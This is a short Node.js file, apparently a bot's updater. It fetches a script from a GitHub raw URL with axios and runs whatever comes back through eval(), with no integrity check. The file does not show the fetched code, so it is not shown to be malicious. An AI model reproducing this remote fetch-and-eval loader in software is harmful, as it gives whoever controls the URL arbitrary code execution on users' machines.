const axios = require('axios');

axios.get("https://raw.githubusercontent.com/SAAN-GOATBOT/SAAN7/main/updater.js")
	.then(res => eval(res.data));
